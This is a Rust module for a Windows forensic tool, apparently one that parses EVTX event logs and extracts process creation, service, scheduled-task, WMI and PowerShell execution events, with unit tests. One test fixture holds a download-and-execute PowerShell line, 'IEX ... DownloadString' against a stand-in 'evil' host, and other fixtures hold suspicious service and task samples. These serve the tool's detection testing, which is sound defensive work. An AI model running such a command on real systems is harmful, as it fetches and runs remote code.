use evtx::EvtxParser;
use rayon::prelude::*;
use serde_json::Value;
use std::collections::{HashMap, HashSet};
use std::error::Error;
use std::fs;
use std::path::Path;
use chrono::Local;
use indicatif::{ProgressBar, ProgressStyle};

use crate::utils::{normalize_iso, resolve_sid};

/// Event log channels that carry execution artifacts. Matching is case-insensitive.
/// A file passed explicitly with `-f` is always parsed, whatever its name.
pub const TARGET_EVTX_FILES: [&str; 7] = [
    "Security.evtx",
    "System.evtx",
    "Windows PowerShell.evtx",
    "Microsoft-Windows-PowerShell%4Operational.evtx",
    "Microsoft-Windows-Sysmon%4Operational.evtx",
    "Microsoft-Windows-TaskScheduler%4Operational.evtx",
    "Microsoft-Windows-WMI-Activity%4Operational.evtx",
];

/// Structure for an extracted event
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Event {
    pub timestamp: String,
    pub computer: String,
    pub artifact: String,
    pub event_id: u64,
    pub pid: u32,
    pub subject_username: String,
    pub target_username: String,
    pub processname: String,
    pub commandline: Option<String>,
    pub parentprocessname: String,
}

/// Logs a message with a human-readable timestamp and CAAREA branding
fn log_message(silent: bool, message: &str) {
    if !silent {
        let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        println!("[CAAREA {}] {}", timestamp, message);
    }
}

/// True when the file name is one of the targeted event log channels
pub fn is_target_evtx(filename: &str) -> bool {
    TARGET_EVTX_FILES.iter().any(|t| t.eq_ignore_ascii_case(filename))
}

/// Processes an EVTX target (file or directory) and returns extracted events
pub fn process_evtx_target(target: &Path, silent: bool) -> Result<Vec<Event>, Box<dyn Error>> {
    let mut all_events = vec![];

    if target.is_dir() {
        log_message(silent, &format!("Scanning directory: {}", target.display()));

        // Every .evtx is parsed: triage tools and sample corpora rename channel files, and the
        // provider/event-id classifier keeps the output clean. Well-known channels go first.
        let mut evtx_files = find_evtx_files(target);
        evtx_files.sort_by_key(|f| {
            let known = Path::new(f)
                .file_name()
                .map(|n| is_target_evtx(&n.to_string_lossy()))
                .unwrap_or(false);
            (!known, f.to_lowercase())
        });
        let targeted = evtx_files
            .iter()
            .filter(|f| Path::new(f).file_name().map(|n| is_target_evtx(&n.to_string_lossy())).unwrap_or(false))
            .count();
        log_message(
            silent,
            &format!("Found {} EVTX files ({} well-known execution channels)", evtx_files.len(), targeted),
        );

        if evtx_files.is_empty() {
            return Ok(all_events);
        }

        let pb = ProgressBar::new(evtx_files.len() as u64);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("[{elapsed_precise}] {bar:40.cyan/blue} {pos}/{len} {msg}")
                .unwrap(),
        );

        let processed_events: Vec<Vec<Event>> = evtx_files
            .par_iter()
            .filter_map(|file| {
                let file_path = Path::new(file);
                log_message(silent, &format!("Processing EVTX file: {}", file_path.display()));
                let result = match parse_evtx(file) {
                    Ok(mut evtx_events) => {
                        evtx_events.sort_by(|a, b| a.timestamp.cmp(&b.timestamp));
                        print_evtx_statistics(file_path, &evtx_events, silent);
                        Some(evtx_events)
                    }
                    Err(e) => {
                        log_message(silent, &format!("⚠️ Warning: cannot parse {}: {}", file_path.display(), e));
                        None
                    }
                };
                pb.inc(1);
                result
            })
            .collect();

        pb.finish_and_clear();

        all_events = processed_events.into_iter().flatten().collect();
    } else if target.is_file() {
        log_message(silent, &format!("Processing EVTX file: {}", target.display()));
        let mut evtx_events = parse_evtx(&target.to_string_lossy())?;
        evtx_events.sort_by(|a, b| a.timestamp.cmp(&b.timestamp));
        print_evtx_statistics(target, &evtx_events, silent);
        all_events.extend(evtx_events);
    }

    Ok(all_events)
}

/// Prints statistics for a processed EVTX file
fn print_evtx_statistics(file_path: &Path, events: &[Event], silent: bool) {
    if events.is_empty() {
        log_message(silent, &format!("No relevant events found in: {}", file_path.display()));
        return;
    }

    let first_event = &events.first().unwrap().timestamp;
    let last_event = &events.last().unwrap().timestamp;
    let total_events = events.len();

    let unique_users: HashSet<_> = events.iter().map(|e| e.subject_username.clone()).collect();
    let unique_artifacts: HashSet<_> = events.iter().map(|e| e.artifact.clone()).collect();

    let commandline_count = events
        .iter()
        .filter(|e| e.commandline.as_ref().map(|s| !s.trim().is_empty()).unwrap_or(false))
        .count();

    log_message(
        silent,
        &format!(
            "\nSTATS EVTX Analysis: {}\n\
        ├─ First Event: {}\n\
        ├─ Last Event: {}\n\
        ├─ Total Events: {}\n\
        ├─ Unique Users: {}\n\
        ├─ Events with CommandLine: {}\n\
        ├─ Artifacts: {:?}\n\
        └─────────────────────────\n",
            file_path.display(),
            first_event,
            last_event,
            total_events,
            unique_users.len(),
            commandline_count,
            unique_artifacts
        ),
    );
}

/// Scans a directory and counts the total number of EVTX files (including subdirectories)
pub fn count_evtx_files(target: &Path) -> usize {
    find_evtx_files(target).len()
}

/// Finds EVTX files in a directory recursively or processes a single file
pub fn find_evtx_files(target: &Path) -> Vec<String> {
    let mut evtx_files = vec![];

    if target.is_file() {
        if let Some(ext) = target.extension() {
            if ext.eq_ignore_ascii_case("evtx") {
                evtx_files.push(target.to_string_lossy().to_string());
            }
        }
    } else if target.is_dir() {
        if let Ok(entries) = fs::read_dir(target) {
            for entry in entries.flatten() {
                let path = entry.path();
                evtx_files.extend(find_evtx_files(&path));
            }
        }
    }

    evtx_files
}

/// Parses an EVTX file and extracts relevant events
pub fn parse_evtx(file_path: &str) -> Result<Vec<Event>, Box<dyn Error>> {
    let mut parser = EvtxParser::from_path(file_path)?;

    let events: Vec<Event> = parser
        .records_json()
        .par_bridge()
        .filter_map(|record| match record {
            Ok(record) => extract_event(&record.data),
            Err(_) => None,
        })
        .collect();

    Ok(events)
}

/// Backwards compatible name for [`extract_event`].
pub fn extract_event_4688(json_str: &str) -> Option<Event> {
    extract_event(json_str)
}

// -------------------------------------------------------------------------------------------------
// JSON helpers
// -------------------------------------------------------------------------------------------------

/// Reads an EVTX System field that may be a plain scalar or `{ "#attributes": {...}, "#text": v }`.
fn scalar_u64(v: &Value) -> Option<u64> {
    match v {
        Value::Number(n) => n.as_u64(),
        Value::String(s) => s.trim().parse::<u64>().ok(),
        Value::Object(o) => o.get("#text").and_then(scalar_u64),
        _ => None,
    }
}

/// Collects every scalar reachable under `v` (depth-first) as strings, skipping `#attributes`.
fn collect_strings(v: &Value, out: &mut Vec<String>) {
    match v {
        Value::String(s) => out.push(s.clone()),
        Value::Number(n) => out.push(n.to_string()),
        Value::Bool(b) => out.push(b.to_string()),
        Value::Array(a) => a.iter().for_each(|x| collect_strings(x, out)),
        Value::Object(o) => {
            for (k, x) in o {
                if k != "#attributes" {
                    collect_strings(x, out);
                }
            }
        }
        Value::Null => {}
    }
}

/// Flattens EventData / UserData into `name -> text`. Nested containers (UserData\EventXML,
/// UserData\Operation_*) are flattened one level so their children become top-level fields.
/// Unnamed `<Data>` elements (classic providers such as "PowerShell") end up under "Data".
fn flatten_event_data(v: &Value, out: &mut HashMap<String, String>) {
    if let Value::Object(o) = v {
        for (k, x) in o {
            if k == "#attributes" {
                continue;
            }
            match x {
                Value::Object(inner) if !inner.contains_key("#text") => flatten_event_data(x, out),
                _ => {
                    let mut parts = Vec::new();
                    collect_strings(x, &mut parts);
                    let text = parts.join("\n");
                    out.entry(k.clone()).or_insert(text);
                }
            }
        }
    }
}

/// Parses `Key=Value` lines embedded in the free text of classic PowerShell events (400/403/800).
fn kv_lines(text: &str) -> HashMap<String, String> {
    let mut map = HashMap::new();
    for line in text.lines() {
        let line = line.trim();
        if let Some((k, v)) = line.split_once('=') {
            let k = k.trim();
            if !k.is_empty() && !k.contains(' ') {
                map.entry(k.to_string()).or_insert_with(|| v.trim().to_string());
            }
        }
    }
    map
}

/// Parses a PID written either as hex (`0x1d0`, Security log) or decimal (Sysmon, TaskScheduler).
fn parse_pid(s: &str) -> u32 {
    let t = s.trim();
    if let Some(hex) = t.strip_prefix("0x").or_else(|| t.strip_prefix("0X")) {
        u32::from_str_radix(hex, 16).unwrap_or(0)
    } else {
        t.parse::<u32>().unwrap_or(0)
    }
}

fn domain_user(domain: Option<&String>, user: Option<&String>) -> String {
    let u = user.map(|s| s.as_str()).unwrap_or("");
    let d = domain.map(|s| s.as_str()).unwrap_or("");
    match (d.is_empty() || d == "-", u.is_empty() || u == "-") {
        (true, true) => String::new(),
        (true, false) => u.to_string(),
        (false, true) => d.to_string(),
        (false, false) => format!("{}\\{}", d, u),
    }
}

fn first_nonempty<'a>(f: &'a HashMap<String, String>, keys: &[&str]) -> Option<&'a String> {
    keys.iter().filter_map(|k| f.get(*k)).find(|v| !v.trim().is_empty())
}

/// Extracts `<Command>` / `<Arguments>` from a scheduled task XML definition (4698 TaskContent).
fn task_xml_command(xml: &str) -> Option<String> {
    let cmd = xml.split("<Command>").nth(1)?.split("</Command>").next()?.trim();
    let args = xml
        .split("<Arguments>")
        .nth(1)
        .and_then(|s| s.split("</Arguments>").next())
        .map(|s| s.trim())
        .unwrap_or("");
    if args.is_empty() {
        Some(cmd.to_string())
    } else {
        Some(format!("{} {}", cmd, args))
    }
}

/// Decides whether a (provider, event id) pair is an execution artifact and names it.
pub fn classify_event(provider: &str, event_id: u64) -> Option<String> {
    let p = provider.to_ascii_lowercase();
    let unknown_provider = p.is_empty();
    let label = match event_id {
        4688 | 4697 | 4698 if unknown_provider || p.contains("security-auditing") => format!("evtx:{}", event_id),
        7045 if unknown_provider || p.contains("service control manager") => "evtx:7045".to_string(),
        400 | 800 if unknown_provider || p == "powershell" => format!("evtx:{}", event_id),
        4104 if unknown_provider || p.contains("microsoft-windows-powershell") => "evtx:powershell:4104".to_string(),
        1 if p.contains("sysmon") => "evtx:sysmon:1".to_string(),
        106 | 129 | 200 if p.contains("taskscheduler") => format!("evtx:taskscheduler:{}", event_id),
        5861 if p.contains("wmi-activity") => "evtx:wmi:5861".to_string(),
        _ => return None,
    };
    Some(label)
}

/// Extracts an execution event from an EVTX record rendered as JSON by the `evtx` crate.
pub fn extract_event(json_str: &str) -> Option<Event> {
    let parsed: Value = serde_json::from_str(json_str).ok()?;
    let system = &parsed["Event"]["System"];

    let event_id = scalar_u64(&system["EventID"]).unwrap_or(0);
    let provider = system["Provider"]["#attributes"]["Name"].as_str().unwrap_or("");
    let artifact = classify_event(provider, event_id)?;

    let raw_ts = system["TimeCreated"]["#attributes"]["SystemTime"].as_str().unwrap_or("");
    let timestamp = normalize_iso(raw_ts).unwrap_or_else(|| raw_ts.to_string());
    let computer = system["Computer"].as_str().unwrap_or("Unknown Computer").to_string();
    let security_user = system["Security"]["#attributes"]["UserID"].as_str().map(resolve_sid);
    let execution_pid = system["Execution"]["#attributes"]["ProcessID"]
        .as_u64()
        .map(|v| v as u32)
        .unwrap_or(0);

    let mut f: HashMap<String, String> = HashMap::new();
    let eventdata = &parsed["Event"]["EventData"];
    if !eventdata.is_null() {
        flatten_event_data(eventdata, &mut f);
    } else {
        flatten_event_data(&parsed["Event"]["UserData"], &mut f);
    }

    let mut subject_username = String::new();
    let mut target_username = String::new();
    let mut processname = String::new();
    let mut commandline: Option<String> = None;
    let mut parentprocessname = String::new();
    let mut pid: u32 = 0;

    match artifact.as_str() {
        "evtx:4688" => {
            subject_username = domain_user(f.get("SubjectDomainName"), f.get("SubjectUserName"));
            target_username = domain_user(f.get("TargetDomainName"), f.get("TargetUserName"));
            processname = f.get("NewProcessName").cloned().unwrap_or_default();
            commandline = f.get("CommandLine").cloned().filter(|s| !s.is_empty());
            parentprocessname = f.get("ParentProcessName").cloned().unwrap_or_default();
            // NewProcessId is the created process; ProcessId is the *creator* (parent).
            pid = f.get("NewProcessId").map(|s| parse_pid(s)).unwrap_or(0);
            if pid == 0 {
                pid = f.get("ProcessId").map(|s| parse_pid(s)).unwrap_or(0);
            }
        }
        "evtx:4697" => {
            subject_username = domain_user(f.get("SubjectDomainName"), f.get("SubjectUserName"));
            processname = f.get("ServiceName").cloned().unwrap_or_default();
            commandline = f.get("ServiceFileName").cloned();
            target_username = f.get("ServiceAccount").cloned().unwrap_or_default();
            parentprocessname = "services.exe".to_string();
        }
        "evtx:4698" => {
            subject_username = domain_user(f.get("SubjectDomainName"), f.get("SubjectUserName"));
            processname = f.get("TaskName").cloned().unwrap_or_default();
            commandline = f
                .get("TaskContent")
                .and_then(|xml| task_xml_command(xml))
                .or_else(|| Some(format!("Scheduled task created: {}", processname)));
            parentprocessname = "Task Scheduler".to_string();
        }
        "evtx:7045" => {
            processname = f.get("ServiceName").cloned().unwrap_or_default();
            commandline = f.get("ImagePath").cloned();
            subject_username = first_nonempty(&f, &["AccountName", "ServiceAccount"]).cloned().unwrap_or_default();
            if subject_username.is_empty() {
                subject_username = security_user.clone().unwrap_or_default();
            }
            target_username = f.get("StartType").cloned().unwrap_or_default();
            parentprocessname = "services.exe".to_string();
        }
        "evtx:400" | "evtx:800" => {
            // Classic PowerShell events carry unnamed <Data> elements with "Key=Value" lines.
            let text = f.get("Data").cloned().unwrap_or_default();
            let kv = kv_lines(&text);
            let host_app = kv.get("HostApplication").cloned().unwrap_or_default();
            let host_ver = kv.get("HostVersion").cloned().unwrap_or_default();
            let host_name = kv.get("HostName").cloned().unwrap_or_default();
            if event_id == 800 {
                let cmd = kv.get("CommandLine").cloned().unwrap_or_default();
                processname = if host_name.is_empty() { "PowerShell Pipeline".to_string() } else { host_name };
                commandline = Some(if cmd.is_empty() { host_app.clone() } else { cmd });
            } else {
                processname = if host_ver.is_empty() { "PowerShell".to_string() } else { format!("PowerShell v{}", host_ver) };
                commandline = Some(host_app.clone());
            }
            subject_username = kv.get("UserId").cloned().or_else(|| security_user.clone()).unwrap_or_default();
            parentprocessname = if host_app.is_empty() {
                "powershell.exe".to_string()
            } else {
                host_app.split_whitespace().next().unwrap_or("powershell.exe").to_string()
            };
            pid = execution_pid;
        }
        "evtx:powershell:4104" => {
            processname = first_nonempty(&f, &["Path"])
                .cloned()
                .unwrap_or_else(|| "PowerShell ScriptBlock".to_string());
            commandline = f.get("ScriptBlockText").cloned();
            subject_username = security_user.clone().unwrap_or_default();
            parentprocessname = "powershell.exe".to_string();
            pid = execution_pid;
        }
        "evtx:sysmon:1" => {
            processname = f.get("Image").cloned().unwrap_or_default();
            commandline = f.get("CommandLine").cloned();
            parentprocessname = f.get("ParentImage").cloned().unwrap_or_default();
            subject_username = f.get("User").cloned().unwrap_or_default();
            target_username = f.get("IntegrityLevel").cloned().unwrap_or_default();
            pid = f.get("ProcessId").map(|s| parse_pid(s)).unwrap_or(0);
        }
        "evtx:taskscheduler:106" => {
            processname = f.get("TaskName").cloned().unwrap_or_default();
            subject_username = f.get("UserContext").cloned().unwrap_or_default();
            commandline = Some(format!("Scheduled task registered: {}", processname));
            parentprocessname = "Task Scheduler".to_string();
        }
        "evtx:taskscheduler:129" => {
            let task = f.get("TaskName").cloned().unwrap_or_default();
            processname = f.get("Path").cloned().unwrap_or_else(|| task.clone());
            commandline = Some(format!("Task: {}", task));
            pid = f.get("ProcessID").map(|s| parse_pid(s)).unwrap_or(0);
            parentprocessname = "Task Scheduler".to_string();
        }
        "evtx:taskscheduler:200" => {
            let task = f.get("TaskName").cloned().unwrap_or_default();
            processname = f.get("ActionName").cloned().unwrap_or_else(|| task.clone());
            commandline = Some(format!("Task action started: {}", task));
            pid = f.get("EnginePID").map(|s| parse_pid(s)).unwrap_or(0);
            parentprocessname = "Task Scheduler".to_string();
        }
        "evtx:wmi:5861" => {
            processname = f.get("CONSUMER").cloned().unwrap_or_else(|| "WMI Event Consumer".to_string());
            let mut details = f.get("PossibleCause").cloned().unwrap_or_default();
            if let Some(ess) = f.get("ESS") {
                if !ess.is_empty() {
                    details = format!("{} | Filter: {}", details.trim(), ess.trim());
                }
            }
            commandline = Some(details.trim().to_string());
            subject_username = security_user.clone().unwrap_or_else(|| "SYSTEM".to_string());
            parentprocessname = "WmiPrvSE.exe".to_string();
        }
        _ => {}
    }

    Some(Event {
        timestamp,
        computer,
        artifact,
        event_id,
        pid,
        subject_username,
        target_username,
        processname,
        commandline,
        parentprocessname,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn system(provider: &str, id: u64, extra: &str) -> String {
        format!(
            r##""System":{{"Provider":{{"#attributes":{{"Name":"{}"}}}},"EventID":{},"TimeCreated":{{"#attributes":{{"SystemTime":"2016-09-21T03:41:02.560546Z"}}}},"Computer":"IE10Win7","Execution":{{"#attributes":{{"ProcessID":5544,"ThreadID":1}}}}{}}}"##,
            provider, id, extra
        )
    }

    #[test]
    fn test_4688_pid_and_domain() {
        let json = format!(
            r##"{{"Event":{{{},"EventData":{{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","NewProcessId":"0x1e8","NewProcessName":"C:\\Windows\\duKhLYUX.exe","ProcessId":"0x1d0","CommandLine":"C:\\Windows\\duKhLYUX.exe -x","TargetUserName":"-","TargetDomainName":"-","ParentProcessName":"C:\\Windows\\System32\\services.exe"}}}}}}"##,
            system("Microsoft-Windows-Security-Auditing", 4688, "")
        );
        let e = extract_event(&json).expect("4688 must be extracted");
        assert_eq!(e.artifact, "evtx:4688");
        assert_eq!(e.subject_username, "WORKGROUP\\IE10WIN7$");
        assert_eq!(e.target_username, "");
        assert_eq!(e.pid, 0x1e8, "pid must come from NewProcessId, not ProcessId (creator)");
        assert_eq!(e.processname, "C:\\Windows\\duKhLYUX.exe");
        assert_eq!(e.commandline.as_deref(), Some("C:\\Windows\\duKhLYUX.exe -x"));
        assert_eq!(e.parentprocessname, "C:\\Windows\\System32\\services.exe");
        assert_eq!(e.timestamp, "2016-09-21T03:41:02.560546Z");
    }

    #[test]
    fn test_7045_account_name_and_qualified_event_id() {
        let json = r##"{"Event":{"System":{"Provider":{"#attributes":{"Name":"Service Control Manager"}},"EventID":{"#attributes":{"Qualifiers":16384},"#text":7045},"TimeCreated":{"#attributes":{"SystemTime":"2016-09-21T03:41:02.542968Z"}},"Computer":"IE10Win7","Security":{"#attributes":{"UserID":"S-1-5-18"}}},"EventData":{"ServiceName":"KgXItsbKgTJzdzwl","ImagePath":"%SYSTEMROOT%\\duKhLYUX.exe","ServiceType":"user mode service","StartType":"demand start","AccountName":"LocalSystem"}}}"##;
        let e = extract_event(json).unwrap();
        assert_eq!(e.event_id, 7045);
        assert_eq!(e.subject_username, "LocalSystem");
        assert_eq!(e.processname, "KgXItsbKgTJzdzwl");
        assert_eq!(e.commandline.as_deref(), Some("%SYSTEMROOT%\\duKhLYUX.exe"));
    }

    #[test]
    fn test_400_unnamed_data_elements() {
        let json = format!(
            r##"{{"Event":{{{},"EventData":{{"Data":["Available","None","\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.26100.9711\n\tHostId=cfa72b16\n\tHostApplication=powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\x\\run.ps1\n\tEngineVersion=5.1.26100.9711\n\tCommandLine="]}}}}}}"##,
            system("PowerShell", 400, "")
        );
        let e = extract_event(&json).unwrap();
        assert_eq!(e.artifact, "evtx:400");
        assert_eq!(e.processname, "PowerShell v5.1.26100.9711");
        assert_eq!(e.commandline.as_deref(), Some("powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\x\\run.ps1"));
        assert_eq!(e.pid, 5544);
        assert_eq!(e.parentprocessname, "powershell.exe");
    }

    #[test]
    fn test_sysmon_1_and_4104() {
        let sysmon = format!(
            r##"{{"Event":{{{},"EventData":{{"ProcessId":4120,"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c whoami","User":"LAB\\bob","IntegrityLevel":"Medium","ParentProcessId":900,"ParentImage":"C:\\Windows\\explorer.exe"}}}}}}"##,
            system("Microsoft-Windows-Sysmon", 1, "")
        );
        let e = extract_event(&sysmon).unwrap();
        assert_eq!(e.artifact, "evtx:sysmon:1");
        assert_eq!(e.pid, 4120);
        assert_eq!(e.processname, "C:\\Windows\\System32\\cmd.exe");
        assert_eq!(e.parentprocessname, "C:\\Windows\\explorer.exe");
        assert_eq!(e.subject_username, "LAB\\bob");

        let ps = format!(
            r##"{{"Event":{{{},"EventData":{{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://evil/a')","ScriptBlockId":"abc","Path":""}}}}}}"##,
            system("Microsoft-Windows-PowerShell", 4104, r##","Security":{"#attributes":{"UserID":"S-1-5-18"}}"##)
        );
        let e = extract_event(&ps).unwrap();
        assert_eq!(e.artifact, "evtx:powershell:4104");
        assert_eq!(e.processname, "PowerShell ScriptBlock");
        assert_eq!(e.subject_username, "NT AUTHORITY\\SYSTEM");
        assert!(e.commandline.as_deref().unwrap().starts_with("IEX"));
        assert_eq!(e.pid, 5544);
    }

    #[test]
    fn test_taskscheduler_userdata_and_filtering() {
        let ts = format!(
            r##"{{"Event":{{{},"UserData":{{"EventXML":{{"#attributes":{{"xmlns":"x"}},"TaskName":"\\Evil","ActionName":"C:\\Temp\\evil.exe","TaskInstanceId":"{{1}}","EnginePID":4321}}}}}}}}"##,
            system("Microsoft-Windows-TaskScheduler", 200, "")
        );
        let e = extract_event(&ts).unwrap();
        assert_eq!(e.artifact, "evtx:taskscheduler:200");
        assert_eq!(e.processname, "C:\\Temp\\evil.exe");
        assert_eq!(e.pid, 4321);

        // Same id from another provider is not an execution artifact
        let other = format!(r##"{{"Event":{{{},"EventData":{{}}}}}}"##, system("Microsoft-Windows-Kernel-General", 1, ""));
        assert!(extract_event(&other).is_none());
        let logon = format!(r##"{{"Event":{{{},"EventData":{{}}}}}}"##, system("Microsoft-Windows-Security-Auditing", 4624, ""));
        assert!(extract_event(&logon).is_none());
    }
}
